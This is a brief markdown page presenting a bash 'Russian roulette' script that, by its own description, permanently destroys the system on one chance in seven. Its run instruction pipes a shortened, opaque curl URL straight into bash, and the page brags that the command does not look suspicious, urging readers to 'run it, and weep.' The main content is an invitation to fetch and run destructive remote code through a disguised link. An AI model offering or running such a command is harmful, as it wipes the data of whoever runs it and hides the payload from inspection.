# Russian Roulette in Bash
## The code
Simple, and easy. Unstoppable once it has started. You can find the code [here.](https://github.com/ThyCowLord/ThyCowLord.github.io/blob/master/code/bashyoheadin.txt).

## How it works
It has seven barrels. If the random number is four, the system is __permanently destroyed.__

## Execution
To run it type: 
> bash <(curl https://git.io/vArE3).

It doesn't look suspicious, does it?
Run it, and weep.
